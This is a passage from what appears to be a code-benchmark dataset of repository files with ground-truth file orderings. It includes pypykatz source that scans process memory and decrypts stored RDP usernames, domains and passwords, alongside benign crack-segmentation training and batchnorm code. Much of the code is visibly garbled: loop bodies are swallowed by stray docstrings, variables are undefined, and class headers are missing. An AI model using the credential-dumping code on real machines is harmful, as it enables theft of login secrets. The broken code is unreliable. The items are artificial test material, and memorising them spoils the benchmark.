RDPCredsTemplate.get_logonpasswords_template(self.sysinfo)\n\t\t\tdecryptor = RDPCredentialDecryptorLogonpasswords(self.process, self.reader, decryptor_template, self.sysinfo, find_first=self.find_first, lower_bound=self.lower_bound, upper_bound=self.upper_bound)\n\t\telse:\n\t\t\tdecryptor_template = RDPCredsTemplate.get_mstsc_template()\n\t\t\tdecryptor = RDPCredentialDecryptorMstsc(self.process, self.reader, decryptor_template, self.sysinfo, find_first=self.find_first)\n\n\t\tdecryptor.start()\n\n\t\tfor cred in decryptor.credentials:\n\t\t\tself.credentials.append(cred)\n\n\tdef start(self):\n\t\tself.rdpcreds()\n'Pypykatz/pypykatz/rdp/packages/creds/decryptor.py'\n:import json\nimport hashlib\nimport math\n\nfrom pypykatz import logger\nfrom pypykatz.commons.common import hexdump\nfrom pypykatz.commons.common import KatzSystemArchitecture, WindowsBuild, WindowsMinBuild\n\n\nclass RDPCredential:\n    def __init__(self):\n        self.credtype = 'rdp'\n        self.domainname = None\n        self.username = ''\n        self.password = ''\n        self.password_raw = b''\n        self.isencrypted = None\n        self.servername = ''\n        self.serverfqdn = ''\n\n    def to_dict(self):\n        t = {}\n        t['credtype'] = self.credtype\n        t['domainname'] = self.cachedir\n        t['username'] = self.PRT\n        t['password'] = self.key_guid\n        t['password_raw'] = self.dpapi_key\n        return t\n\n    def to_json(self):\n        return json.dumps(self.to_dict())\n\n    def __str__(self):\n        t = '\\t== RDP Credential ==\\n'\n        t += '\\t\\tdomainname %s\\n' % self.domainname\n        t += '\\t\\tusername %s\\n' % self.username\n        t += '\\t\\tpassword \\'%s\\'\\n' % self.password\n\n        try:\n            t += '\\t\\tpassword_raw %s\\n' % self.password_raw.hex()\n        except:\n            t += '\\t\\tpassword_raw %s\\n' % self.password_raw\n\n        t += '\\t\\tisencrypted: %s\\n' % str(self.isencrypted)\n        t += '\\t\\tservername: \\'%s\\'\\n' % self.servername\n        t += '\\t\\tserverfqdn: \\'%s\\'\\n' % self.serverfqdn\n        return t\n\nclass RDPCredentialDecryptorMstsc:\n    def __init__(self, process, reader, decryptor_template, sysinfo, find_first=False):\n        self.process = process\n        self.reader = reader\n        self.sysinfo = sysinfo\n        self.decryptor_template = decryptor_template\n        self.credentials = []\n        self.find_first = find_first\n\n    def find_string(self, chunck):\n        marker = chunck.find(b'\\x00\\x00')\n        if marker <= 0:\n            chunck = b''\n        return chunck[:marker + 1]\n\n    def find_entries(self, chunksize=10*1024):\n        reader = self.reader.get_reader()\n        handler = reader.get_handler()\n        memory_segments = reader.get_memory()\n\n\n        for ms in memory_segments:\n            x = ms.search(self.decryptor_template.signature, handler)\n\n            for addr in x:\n                self.reader.move(addr)\n                properties = self.decryptor_template.properties_struct(self.reader)\n                if properties.unkh0 == int(0xdbcaabcd):\n                    if properties.unkd1 >= 10 and properties.unkd1 < 500:\n                        if properties.cbProperties >= 10 and properties.cbProperties < 500:\n                            if properties.pProperties.value:\n                                \"\"\"\n                                logger.debug(\"========TS_PROPERTIES_KIWI=========\")\n                                logger.debug(\"unkh0 = {}\".format(hex(properties.unkh0)))\n                                logger.debug(\"unkd0 = {}\".format(hex(properties.unkd0)))\n                                logger.debug(\"unkp2 = {}\".format(hex(properties.unkp2)))\n                                logger.debug(\"unkd1 = {}\".format(properties.unkd1))\n                                logger.debug(\"unkp3 = {}\".format(hex(properties.unkp3)))\n                                logger.debug(\"pProperties = {}\".format(hex(properties.pProperties.value)))\n                                logger.debug(\"cbProperties = {}\".format(properties.cbProperties))\n                                logger.debug(\"===================================\")\n\n                                            logger.debug(\"========TS_PROPERTY_KIWI=========\")\n                                            logger.debug(\"szProperty = {}\".format(hex(property.szProperty)))\n                                            logger.debug(\"dwType = {}\".format(property.dwType))\n                                            logger.debug(\"pvData = {}\".format(hex(property.pvData)))\n                                            logger.debug(\"unkp0 = {}\".format(property.unkp0))\n                                            logger.debug(\"unkd0 = {}\".format(property.unkd0))\n                                            logger.debug(\"dwFlags = {}\".format(property.dwFlags))\n                                            logger.debug(\"unkd1 = {}\".format(property.unkd1))\n                                            logger.debug(\"unkd2 = {}\".format(property.unkd2))\n                                            logger.debug(\"pValidator = {}\".format(hex(property.pValidator)))\n                                            logger.debug(\"unkp2 = {}\".format(property.unkp2))\n                                            logger.debug(\"unkp3 = {}\".format(property.unkp3))\n                                            logger.debug(\"=================================\")\n                                            \"\"\"\n                                            current_addr = self.reader.tell()\n                                            try:\n                                                self.reader.move(property.szProperty)\n                                                chunck = self.reader.read(1024)\n                                                string = self.find_string(chunck)\n                                                marker = string.find(b'\\x00')\n                                                if marker > 0:\n                                                    string = string[:marker]\n                                                szProperty = string.decode('utf-8')\n\n                                                szProperties = [\"ServerName\", \"ServerFqdn\", \"ServerNameUsedForAuthentication\", \"UserSpecifiedServerName\", \"UserName\", \"Domain\", \"Password\", \"SmartCardReaderName\", \"RDmiUsername\", \"PasswordContainsSCardPin\"]\n                                                if szProperty in szProperties:\n                                                    value = ''\n                                                    if property.dwType == 3:\n                                                        value = \"TRUE\" if property.pvData else \"FALSE\"\n\n\n                                                    if property.dwType == 4:\n                                                        self.reader.move(property.pvData)\n                                                        chunck = self.reader.read(1024)\n                                                        string = self.find_string(chunck)\n                                                        value = string.decode('utf-16-le')\n\n\n                                                    elif property.dwType == 6:\n                                                        if property.pvData and property.unkp2:\n                                                            self.reader.move(property.pvData)\n                                                            chunck = self.reader.read(property.unkp2)\n                                                            if property.dwFlags & 0x800:\n\n                                                                if self.process is None:\n                                                                    value = chunck\n                                                                else:\n                                                                    value = self.process.dpapi_memory_unprotect(property.pvData, property.unkp2, 0)\n                                                                    if len(value) > 4:\n                                                                        value = value[4:]\n                                                            else:\n\n                                                                value = chunck\n\n                                                    if value is None:\n                                                        value = b''\n                                                    if szProperty == \"ServerName\":\n                                                        cred.servername = value\n                                                    elif szProperty == \"ServerFqdn\":\n                                                        cred.serverfqdn = value\n                                                    elif szProperty == \"UserName\":\n                                                        cred.username = value\n                                                    elif szProperty == \"Domain\":\n                                                        cred.domainname = value\n                                                    elif szProperty == \"Password\" and (property.dwFlags & 0x800):\n                                                        cred.password_raw = value\n                                                        if self.process is None:\n                                                            cred.password = ''\n                                                            cred.isencrypted = True\n                                                        else:\n                                                            cred.password = cred.password_raw.decode('utf-16-le').rstrip('\\x00')\n                                                            cred.isencrypted = False\n                                                    elif szProperty == \"Password\":\n                                                        cred.password_raw = value\n                                                        cred.password = value.decode('utf-16-le')\n                                                        cred.isencrypted = False\n\n                                            except Exception as e:\n                                                logger.debug(\"Error: {}\".format(e))\n                                            self.reader.move(current_addr)\n\n                                    if cred.username:\n                                        self.credentials.append(cred)\n                                        if self.find_first:\n                                            return\n\n                                except Exception as e:\n                                    logger.debug(\"Error: {}\".format(e))\n\n\n    def start(self, chunksize=10*1024):\n\n        self.find_entries(chunksize)\n        if not len(self.credentials):\n            logger.debug('No RDP credentials found!')\n\n\nclass RDPCredentialDecryptorLogonpasswords:\n    def __init__(self, process, reader, decryptor_template, sysinfo, find_first=False, lower_bound=0, upper_bound=-1):\n        self.process = process\n        self.reader = reader\n        self.sysinfo = sysinfo\n        self.decryptor_template = decryptor_template\n        self.credentials = []\n        self.find_first = find_first\n        self.lower_bound = lower_bound\n        self.upper_bound = upper_bound\n\n    def add_entry(self, rdpcred_entry):\n        if hex(rdpcred_entry.unk1.value & 0xff010000) == hex(0x00010000):\n            bIsCandidate = True\n        elif not hex(rdpcred_entry.unk1.value & 0xffff0000):\n            bIsCandidate = True\n        else:\n            bIsCandidate = False\n\n        try:\n            if bIsCandidate and rdpcred_entry.cbDomain <= 512 and rdpcred_entry.cbUsername <= 512 and rdpcred_entry.cbUsername > 0 and rdpcred_entry.cbPassword <= 512 and rdpcred_entry.cbPassword > 0:\n                domainame = rdpcred_entry.Domain[:rdpcred_entry.cbDomain].decode('utf-16-le')\n                username = rdpcred_entry.UserName[:rdpcred_entry.cbUsername].decode('utf-16-le')\n                password_raw = rdpcred_entry.Password[:rdpcred_entry.cbPassword]\n\n                if self.sysinfo.buildnumber >= WindowsMinBuild.WIN_10.value:\n                    if self.process is None:\n                        logger.debug('Credentials found but they are encrypted!')\n                        password_raw = rdpcred_entry.Password[:16 * math.ceil(rdpcred_entry.cbPassword/16)]\n                        password = ''\n                        isencrypted = True\n                    else:\n                        password_raw = self.process.dpapi_memory_unprotect(rdpcred_entry.Password_addr, rdpcred_entry.cbPassword, 0)\n                        password = password_raw.decode('utf-16-le').rstrip('\\x00')\n                        isencrypted = False\n                else:\n                    password = password_raw.decode('utf-16-le')\n                    password_raw = password_raw.split(b'\\x00\\x00')[0] + b'\\x00'\n                    isencrypted = False\n\n                cred = RDPCredential()\n                cred.domainname = domainame\n                cred.username = username\n                cred.password = password\n                cred.password_raw = password_raw\n                cred.isencrypted = isencrypted\n                self.credentials.append(cred)\n\n            else:\n                logger.debug('This RDPCred entry is garbage!')\n        except Exception as e:\n            logger.debug('RDP entry parsing error! Reason %s' % e)\n\n\n    def start(self, chunksize=10*1024):\n        reader = self.reader.get_reader()\n        handler = reader.get_handler()\n        memory_segments = reader.get_memory()\n\n        if self.upper_bound == -1:\n            self.upper_bound = len(memory_segments)\n\n        for idx, ms in enumerate(memory_segments):\n            if idx > self.lower_bound and idx < self.upper_bound:\n                x = []\n                for signature in self.decryptor_template.signatures:\n                    x += ms.search(signature, handler)\n\n                for addr in x:\n                    addr += self.decryptor_template.offset\n                    self.reader.move(addr)\n\n                    try:\n                        cred = self.decryptor_template.cred_struct(self.reader)\n                    except Exception as e:\n                        logger.debug('Reading error! (this can be normal here) %s' % str(e))\n                        continue\n\n                    self.add_entry(cred)\n                    if len(self.credentials) > 0 and self.find_first:\n                        return\n\n\n",
        "gt": [
            "'Pypykatz/pypykatz/rdp/packages/creds/decryptor.py'",
            "'Pypykatz/pypykatz/rdp/parser.py'",
            "'Pypykatz/pypykatz/rdp/cmdhelper.py'",
            "'Pypykatz/pypykatz/__main__.py'"
        ]
    },
    {
        "files": [
            "'CSSR/model/utils/sync_batchnorm/__init__.py'",
            "'CSSR/train.py'",
            "'CSSR/model/utils/sync_batchnorm/comm.py'",
            "'CSSR/model/utils/sync_batchnorm/batchnorm.py'"
        ],
        "content": "'CSSR/model/utils/sync_batchnorm/__init__.py'\n:\n\n\n\n\n\n\n\n\n\nfrom .batchnorm import SynchronizedBatchNorm1d, SynchronizedBatchNorm2d, SynchronizedBatchNorm3d\nfrom .batchnorm import patch_sync_batchnorm, convert_model\nfrom .replicate import DataParallelWithCallback, patch_replication_callback\n\n'CSSR/train.py'\n:import numpy as np\nimport argparse\nimport os\nimport random\nimport shutil\nimport datetime\n\nimport torch\nfrom torch.utils.data import DataLoader\nfrom torch.utils.data.sampler import SequentialSampler, BatchSampler\n\nfrom model.utils.sync_batchnorm import convert_model\nfrom model.config import cfg\nfrom model.engine.trainer import do_train\nimport torchvision.transforms as transforms\nfrom model.data.transforms.data_preprocess import TrainTransforms, TestTransforms\nfrom model.data.transforms.transforms import FactorResize\nfrom model.modeling.build_model import ModelWithLoss, InvModelWithLoss\nfrom model.data.crack_dataset import CrackDataSet\nfrom model.utils.misc import str2bool, fix_model_state_dict\nfrom model.data import samplers\nfrom model.utils.lr_scheduler import WarmupMultiStepLR\nfrom torch.multiprocessing import Pool, Process, set_start_method\n\ndef train(args, cfg):\n    device = torch.device(cfg.DEVICE)\n\n    print('Loading Datasets...')\n    train_transforms = TrainTransforms(cfg)\n    sr_transforms = FactorResize(cfg.MODEL.SCALE_FACTOR)\n    trainval_dataset = CrackDataSet(cfg, cfg.DATASET.TRAIN_IMAGE_DIR, cfg.DATASET.TRAIN_MASK_DIR, transforms=train_transforms, sr_transforms=sr_transforms)\n\n    n_samples = len(trainval_dataset)\n    train_size = int(len(trainval_dataset) * cfg.SOLVER.TRAIN_DATASET_RATIO)\n    val_size = n_samples - train_size\n    print(f\"Train dataset size: {train_size}, Validation dataset size: {val_size}\")\n    train_dataset, val_dataset = torch.utils.data.random_split(trainval_dataset, [train_size, val_size])\n\n    sampler = torch.utils.data.RandomSampler(train_dataset)\n    batch_sampler = torch.utils.data.sampler.BatchSampler(sampler=sampler, batch_size=cfg.SOLVER.BATCH_SIZE, drop_last=True)\n    batch_sampler = samplers.IterationBasedBatchSampler(batch_sampler, num_iterations=cfg.SOLVER.MAX_ITER)\n    train_loader = DataLoader(train_dataset, num_workers=args.num_workers, batch_sampler=batch_sampler, pin_memory=True)\n\n    eval_sampler = SequentialSampler(val_dataset)\n    eval_batch_sampler = BatchSampler(sampler=eval_sampler, batch_size=cfg.SOLVER.BATCH_SIZE, drop_last=True)\n    eval_loader = DataLoader(val_dataset, num_workers=args.num_workers, batch_sampler=eval_batch_sampler, pin_memory=True)\n\n    print('Building model...')\n    if cfg.MODEL.SR_SEG_INV:\n        model = InvModelWithLoss(cfg, num_train_ds=train_size, resume_iter=args.resume_iter, sr_transforms=sr_transforms).to(device)\n        print(f'------------Model Architecture-------------\\n\\n<Network SS>\\n{model.segmentation_model}\\n\\n<Network SR>\\n{model.sr_model}')\n    else:\n        model = ModelWithLoss(cfg, num_train_ds=train_size, resume_iter=args.resume_iter).to(device)\n        print(f'------------Model Architecture-------------\\n\\n<Network SR>\\n{model.sr_model}\\n\\n<Network SS>\\n{model.segmentation_model}')\n\n    if cfg.MODEL.OPTIMIZER == \"Adam\":\n        optimizer = torch.optim.Adam(filter(lambda p:p.requires_grad, model.parameters()), lr=cfg.SOLVER.LR)\n    elif cfg.MODEL.OPTIMIZER == \"SGD\":\n        optimizer = torch.optim.SGD(filter(lambda p:p.requires_grad, model.parameters()), lr=cfg.SOLVER.LR, momentum=0.9, weight_decay=5e-4)\n\n    milestones = [step for step in cfg.SOLVER.LR_STEPS]\n    scheduler = WarmupMultiStepLR(cfg, optimizer=optimizer, milestones=milestones, gamma=cfg.SOLVER.GAMMA, warmup_factor=cfg.SOLVER.WARMUP_FACTOR, warmup_iters=cfg.SOLVER.WARMUP_ITERS)\n\n    if args.resume_iter > 0:\n        print('Resume from {}'.format(os.path.join(cfg.OUTPUT_DIR, 'model', 'iteration_{}.pth'.format(args.resume_iter))))\n        model.load_state_dict(fix_model_state_dict(torch.load(os.path.join(cfg.OUTPUT_DIR, 'model', 'iteration_{}.pth'.format(args.resume_iter)))))\n        optimizer.load_state_dict(torch.load(os.path.join(cfg.OUTPUT_DIR, 'optimizer', 'iteration_{}.pth'.format(args.resume_iter))))\n\n    if cfg.SOLVER.SYNC_BATCHNORM:\n        model = convert_model(model).to(device)\n\n    if args.num_gpus > 1:\n        device_ids = list(range(args.num_gpus))\n\n        print(\"device_ids:\",device_ids)\n        model = torch.nn.DataParallel(model, device_ids=device_ids)\n\n    do_train(args, cfg, model, optimizer, scheduler, train_loader, eval_loader)\n\ndef main():\n    parser = argparse.ArgumentParser(description='Crack Segmentation with Super Resolution(CSSR)')\n    parser.add_argument('--config_file', type=str, default='./config/configs_train.yaml', metavar='FILE', help='path to config file')\n    parser.add_argument('--output_dirname', type=str, default='', help='')\n    parser.add_argument('--num_workers', type=int, default=2, help='')\n    parser.add_argument('--log_step', type=int, default=50, help='')\n    parser.add_argument('--save_step', type=int, default=2000)\n    parser.add_argument('--eval_step', type=int, default=250)\n    parser.add_argument('--num_gpus', type=int, default=6)\n    parser.add_argument('--mixed_precision', type=str2bool, default=False)\n    parser.add_argument('--wandb_flag', type=str2bool, default=True)\n    parser.add_argument('--resume_iter', type=int, default=0)\n    parser.add_argument('--debug', type=bool, default=False)\n    parser.add_argument('--wandb_prj_name', type=str, default=\"CSSR_train\")\n\n    args = parser.parse_args()\n\n    torch.manual_seed(cfg.SEED)\n    random.seed(cfg.SEED)\n    np.random.seed(cfg.SEED)\n\n    cuda = torch.cuda.is_available()\n    if cuda:\n        torch.backends.cudnn.benchmark = True\n        torch.backends.cudnn.deterministic = True\n        torch.cuda.manual_seed(cfg.SEED)\n\n    if len(args.config_file) > 0:\n        print('Configration file is loaded from {}'.format(args.config_file))\n        cfg.merge_from_file(args.config_file)\n\n    if \"_ds_\" in cfg.DATASET.TRAIN_IMAGE_DIR:\n        cfg.INPUT.IMAGE_SIZE = int(cfg.INPUT.IMAGE_SIZE / cfg.MODEL.SCALE_FACTOR )\n\n    cfg.freeze()\n\n    if not args.debug and args.resume_iter == 0:\n        os.makedirs(cfg.OUTPUT_DIR, exist_ok=True)\n        shutil.copy2(args.config_file, os.path.join(cfg.OUTPUT_DIR, 'config.yaml'))\n\n    train(args, cfg)\n\nif __name__ == '__main__':\n    set_start_method('spawn')\n    main()\n\n'CSSR/model/utils/sync_batchnorm/comm.py'\n:\n\n\n\n\n\n\n\n\n\nimport queue\nimport collections\nimport threading\n\n__all__ = ['FutureResult', 'SlavePipe', 'SyncMaster']\n\n\nclass FutureResult(object):\n\n\n    def __init__(self):\n        self._result = None\n        self._lock = threading.Lock()\n        self._cond = threading.Condition(self._lock)\n\n    def put(self, result):\n        with self._lock:\n            assert self._result is None, 'Previous result has\\'t been fetched.'\n            self._result = result\n            self._cond.notify()\n\n    def get(self):\n        with self._lock:\n            if self._result is None:\n                self._cond.wait()\n\n            res = self._result\n            self._result = None\n            return res\n\n\n_MasterRegistry = collections.namedtuple('MasterRegistry', ['result'])\n_SlavePipeBase = collections.namedtuple('_SlavePipeBase', ['identifier', 'queue', 'result'])\n\n\nclass SlavePipe(_SlavePipeBase):\n\n\n    def run_slave(self, msg):\n        self.queue.put((self.identifier, msg))\n        ret = self.result.get()\n        self.queue.put(True)\n        return ret\n\n\nclass SyncMaster(object):\n\n\n    def __init__(self, master_callback):\n\n        self._master_callback = master_callback\n        self._queue = queue.Queue()\n        self._registry = collections.OrderedDict()\n        self._activated = False\n\n    def __getstate__(self):\n        return {'master_callback': self._master_callback}\n\n    def __setstate__(self, state):\n        self.__init__(state['master_callback'])\n\n    def register_slave(self, identifier):\n\n        if self._activated:\n            assert self._queue.empty(), 'Queue is not clean before next initialization.'\n            self._activated = False\n            self._registry.clear()\n        future = FutureResult()\n        self._registry[identifier] = _MasterRegistry(future)\n        return SlavePipe(identifier, self._queue, future)\n\n    def run_master(self, master_msg):\n\n        self._activated = True\n\n        intermediates = [(0, master_msg)]\n        for i in range(self.nr_slaves):\n            intermediates.append(self._queue.get())\n\n        results = self._master_callback(intermediates)\n        assert results[0][0] == 0, 'The first result should belongs to the master.'\n\n        for i, res in results:\n            if i == 0:\n                continue\n            self._registry[i].result.put(res)\n\n        for i in range(self.nr_slaves):\n            assert self._queue.get() is True\n\n        return results[0][1]\n\n    @property\n    def nr_slaves(self):\n        return len(self._registry)\n\n'CSSR/model/utils/sync_batchnorm/batchnorm.py'\n:\n\n\n\n\n\n\n\n\n\nimport collections\nimport contextlib\n\nimport torch\nimport torch.nn.functional as F\n\nfrom torch.nn.modules.batchnorm import _BatchNorm\n\ntry:\n    from torch.nn.parallel._functions import ReduceAddCoalesced, Broadcast\nexcept ImportError:\n    ReduceAddCoalesced = Broadcast = None\n\ntry:\n    from jactorch.parallel.comm import SyncMaster\n    from jactorch.parallel.data_parallel import JacDataParallel as DataParallelWithCallback\nexcept ImportError:\n    from .comm import SyncMaster\n    from .replicate import DataParallelWithCallback\n\n__all__ = [\n    'SynchronizedBatchNorm1d', 'SynchronizedBatchNorm2d', 'SynchronizedBatchNorm3d',\n    'patch_sync_batchnorm', 'convert_model'\n]\n\n\ndef _sum_ft(tensor):\n\n    return tensor.sum(dim=0).sum(dim=-1)\n\n\ndef _unsqueeze_ft(tensor):\n\n    return tensor.unsqueeze(0).unsqueeze(-1)\n\n\n_ChildMessage = collections.namedtuple('_ChildMessage', ['sum', 'ssum', 'sum_size'])\n_MasterMessage = collections.namedtuple('_MasterMessage', ['sum', 'inv_std'])\n\n\nclass _SynchronizedBatchNorm(_BatchNorm):\n    def __init__(self, num_features, eps=1e-5, momentum=0.1, affine=True):\n        assert ReduceAddCoalesced is not None, 'Can not use Synchronized Batch Normalization without CUDA support.'\n\n        super(_SynchronizedBatchNorm, self).__init__(num_features, eps=eps, momentum=momentum, affine=affine)\n\n        self._sync_master = SyncMaster(self._data_parallel_master)\n\n        self._is_parallel = False\n        self._parallel_id = None\n        self._slave_pipe = None\n\n    def forward(self, input):\n\n        if not (self._is_parallel and self.training):\n            return F.batch_norm(\n                input, self.running_mean, self.running_var, self.weight, self.bias,\n                self.training, self.momentum, self.eps)\n\n\n        input_shape = input.size()\n        input = input.view(input.size(0), self.num_features, -1)\n\n\n        sum_size = input.size(0) * input.size(2)\n        input_sum = _sum_ft(input)\n        input_ssum = _sum_ft(input ** 2)\n\n\n        if self._parallel_id == 0:\n            mean, inv_std = self._sync_master.run_master(_ChildMessage(input_sum, input_ssum, sum_size))\n        else:\n            mean, inv_std = self._slave_pipe.run_slave(_ChildMessage(input_sum, input_ssum, sum_size))\n\n\n        if self.affine:\n\n            output = (input - _unsqueeze_ft(mean)) * _unsqueeze_ft(inv_std * self.weight) + _unsqueeze_ft(self.bias)\n        else:\n            output = (input - _unsqueeze_ft(mean)) * _unsqueeze_ft(inv_std)\n\n\n        return output.view(input_shape)\n\n    def __data_parallel_replicate__(self, ctx, copy_id):\n        self._is_parallel = True\n        self._parallel_id = copy_id\n\n\n        if self._parallel_id == 0:\n            ctx.sync_master = self._sync_master\n        else:\n            self._slave_pipe = ctx.sync_master.register_slave(copy_id)\n\n    def _data_parallel_master(self, intermediates):\n\n\n\n\n        intermediates = sorted(intermediates, key=lambda i: i[1].sum.get_device())\n\n        to_reduce = [i[1][:2] for i in intermediates]\n        to_reduce = [j for i in to_reduce for j in i]\n        target_gpus = [i[1].sum.get_device() for i in intermediates]\n\n        sum_size = sum([i[1].sum_size for i in intermediates])\n        sum_, ssum = ReduceAddCoalesced.apply(target_gpus[0], 2, *to_reduce)\n        mean, inv_std = self._compute_mean_std(sum_, ssum, sum_size)\n\n        broadcasted = Broadcast.apply(target_gpus, mean, inv_std)\n\n        outputs = []\n        for i, rec in enumerate(intermediates):\n            outputs.append((rec[0], _MasterMessage(*broadcasted[i*2:i*2+2])))\n\n        return outputs\n\n    def _compute_mean_std(self, sum_, ssum, size):\n\n        assert size > 1, 'BatchNorm computes unbiased standard-deviation, which requires size > 1.'\n        mean = sum_ / size\n        sumvar = ssum - sum_ * mean\n        unbias_var = sumvar / (size - 1)\n        bias_var = sumvar / size\n\n        if hasattr(torch, 'no_grad'):\n            with torch.no_grad():\n                self.running_mean = (1 - self.momentum) * self.running_mean + self.momentum * mean.data\n                self.running_var = (1 - self.momentum) * self.running_var + self.momentum * unbias_var.data\n        else:\n            self.running_mean = (1 - self.momentum) * self.running_mean + self.momentum * mean.data\n            self.running_var = (1 - self.momentum) * self.running_var + self.momentum * unbias_var.data\n\n        return mean, bias_var.clamp(self.eps) ** -0.5\n\n\nclass SynchronizedBatchNorm1d(_SynchronizedBatchNorm):\n    r\"\"\"Applies Synchronized Batch Normalization over a 2d or 3d input that is seen as a\n    mini-batch.\n\n    .. math::\n\n        y = \\frac{x - mean[x]}{ \\sqrt{Var[x] + \\epsilon}} * gamma + beta\n\n    This module differs from the built-in PyTorch BatchNorm1d as the mean and\n    standard-deviation are reduced across all devices during training.\n\n    For example, when one uses `nn.DataParallel` to wrap the network during\n    training, PyTorch's implementation normalize the tensor on each device using\n    the statistics only on that device, which accelerated the computation and\n    is also easy to implement, but the statistics might be inaccurate.\n    Instead, in this synchronized version, the statistics will be computed\n    over all training samples distributed on multiple devices.\n\n    Note that, for one-GPU or CPU-only case, this module behaves exactly same\n    as the built-in PyTorch implementation.\n\n    The mean and standard-deviation are calculated per-dimension over\n    the mini-batches and gamma and beta are learnable parameter vectors\n    of size C (where C is the input size).\n\n    During training, this layer keeps a running estimate of its computed mean\n    and variance. The running sum is kept with a default momentum of 0.1.\n\n    During evaluation, this running mean/variance is used for normalization.\n\n    Because the BatchNorm is done over the `C` dimension, computing statistics\n    on `(N, L)` slices, it's common terminology to call this Temporal BatchNorm\n\n    Args:\n        num_features: num_features from an expected input of size\n            `batch_size x num_features [x width]`\n        eps: a value added to the denominator for numerical stability.\n            Default: 1e-5\n        momentum: the value used for the running_mean and running_var\n            computation. Default: 0.1\n        affine: a boolean value that when set to ``True``, gives the layer learnable\n            affine parameters. Default: ``True``\n\n    Shape::\n        - Input: :math:`(N, C)` or :math:`(N, C, L)`\n        - Output: :math:`(N, C)` or :math:`(N, C, L)` (same shape as input)\n\n    Examples:\n        >>>\n        >>> m = SynchronizedBatchNorm1d(100)\n        >>>\n        >>> m = SynchronizedBatchNorm1d(100, affine=False)\n        >>> input = torch.autograd.Variable(torch.randn(20, 100))\n        >>> output = m(input)\n    Applies Batch Normalization over a 4d input that is seen as a mini-batch\n    of 3d inputs\n\n    .. math::\n\n        y = \\frac{x - mean[x]}{ \\sqrt{Var[x] + \\epsilon}} * gamma + beta\n\n    This module differs from the built-in PyTorch BatchNorm2d as the mean and\n    standard-deviation are reduced across all devices during training.\n\n    For example, when one uses `nn.DataParallel` to wrap the network during\n    training, PyTorch's implementation normalize the tensor on each device using\n    the statistics only on that device, which accelerated the computation and\n    is also easy to implement, but the statistics might be inaccurate.\n    Instead, in this synchronized version, the statistics will be computed\n    over all training samples distributed on multiple devices.\n\n    Note that, for one-GPU or CPU-only case, this module behaves exactly same\n    as the built-in PyTorch implementation.\n\n    The mean and standard-deviation are calculated per-dimension over\n    the mini-batches and gamma and beta are learnable parameter vectors\n    of size C (where C is the input size).\n\n    During training, this layer keeps a running estimate of its computed mean\n    and variance. The running sum is kept with a default momentum of 0.1.\n\n    During evaluation, this running mean/variance is used for normalization.\n\n    Because the BatchNorm is done over the `C` dimension, computing statistics\n    on `(N, H, W)` slices, it's common terminology to call this Spatial BatchNorm\n\n    Args:\n        num_features: num_features from an expected input of\n            size batch_size x num_features x height x width\n        eps: a value added to the denominator for numerical stability.\n            Default: 1e-5\n        momentum: the value used for the running_mean and running_var\n            computation. Default: 0.1\n        affine: a boolean value that when set to ``True``, gives the layer learnable\n            affine parameters. Default: ``True``\n\n    Shape::\n        - Input: :math:`(N, C, H, W)`\n        - Output: :math:`(N, C, H, W)` (same shape as input)\n\n    Examples:\n        >>>\n        >>> m = SynchronizedBatchNorm2d(100)\n        >>>\n        >>> m = SynchronizedBatchNorm2d(100, affine=False)\n        >>> input = torch.autograd.Variable(torch.randn(20, 100, 35, 45))\n        >>> output = m(input)\n    Applies Batch Normalization over a 5d input that is seen as a mini-batch\n    of 4d inputs\n\n    .. math::\n\n        y = \\frac{x - mean[x]}{ \\sqrt{Var[x] + \\epsilon}} * gamma + beta\n\n    This module differs from the built-in PyTorch BatchNorm3d as the mean and\n    standard-deviation are reduced across all devices during training.\n\n    For example, when one uses `nn.DataParallel` to wrap the network during\n    training, PyTorch's implementation normalize the tensor on each device using\n    the statistics only on that device, which accelerated the computation and\n    is also easy to implement, but the statistics might be inaccurate.\n    Instead, in this synchronized version, the statistics will be computed\n    over all training samples distributed on multiple devices.\n\n    Note that, for one-GPU or CPU-only case, this module behaves exactly same\n    as the built-in PyTorch implementation.\n\n    The mean and standard-deviation are calculated per-dimension over\n    the mini-batches and gamma and beta are learnable parameter vectors\n    of size C (where C is the input size).\n\n    During training, this layer keeps a running estimate of its computed mean\n    and variance. The running sum is kept with a default momentum of 0.1.\n\n    During evaluation, this running mean/variance is used for normalization.\n\n    Because the BatchNorm is done over the `C` dimension, computing statistics\n    on `(N, D, H, W)` slices, it's common terminology to call this Volumetric BatchNorm\n    or Spatio-temporal BatchNorm\n\n    Args:\n        num_features: num_features from an expected input of\n            size batch_size x num_features x depth x height x width\n        eps: a value added to the denominator for numerical stability.\n            Default: 1e-5\n        momentum: the value used for the running_mean and running_var\n            computation. Default: 0.1\n        affine: a boolean value that when set to ``True``, gives the layer learnable\n            affine parameters. Default: ``True``\n\n    Shape::\n        - Input: :math:`(N, C, D, H, W)`\n        - Output: :math:`(N, C, D, H, W)` (same shape as input)\n\n    Examples:\n        >>>\n        >>> m = SynchronizedBatchNorm3d(100)\n        >>>\n        >>> m = SynchronizedBatchNorm3d(100, affine=False)\n        >>> input = torch.autograd.Variable(torch.randn(20, 100, 35, 45, 10))\n        >>> output = m(input)\n    Traverse the input module and its child recursively\n       and replace all instance of torch.nn.modules.batchnorm.BatchNorm*N*d\n       to SynchronizedBatchNorm*N*d\n\n    Args:\n        module: the input module needs to be convert to SyncBN model\n\n    Examples:\n        >>> import torch.nn as nn\n        >>> import torchvision\n        >>>\n        >>> m = torchvision.models.resnet18(True)\n        >>> m = nn.DataParallel(m)\n        >>>\n        >>> m = convert_model(m)\n    \"\"\"\n    if isinstance(module, torch.nn.DataParallel):\n        mod = module.module\n        mod = convert_model(mod)\n        mod = DataParallelWithCallback(mod)\n        return mod\n\n    mod = module\n    for pth_module, sync_module in zip([torch.nn.modules.batchnorm.BatchNorm1d,\n                                        torch.nn.modules.batchnorm.BatchNorm2d,\n                                        torch.nn.modules.batchnorm.BatchNorm3d],\n                                       [SynchronizedBatchNorm1d,\n                                        SynchronizedBatchNorm2d,\n                                        SynchronizedBatchNorm3d]):\n        if isinstance(module, pth_module):\n            mod = sync_module(module.num_features, module.eps, module.momentum, module.affine)\n            mod.running_mean = module.running_mean\n            mod.running_var = module.running_var\n            if module.affine:\n                mod.weight.data = module.weight.data.clone().detach()\n                mod.bias.data = module.bias.data.clone().detach()\n\n    for name, child in module.named_children():\n        mod.add_module(name, convert_model(child))\n\n    return mod\n",
        "gt": [
            "'CSSR/model/utils/sync_batchnorm/comm.py'",
            "'CSSR/model/utils/sync_batchnorm/batchnorm.py'",
            "'CSSR/model/utils/sync_batchnorm/__init__.py'",
            "'CSSR/train.py'"
        ]
    },
    {
        "files": [
            "'osr2mp4-app/HomeComponents/Logo.py'",
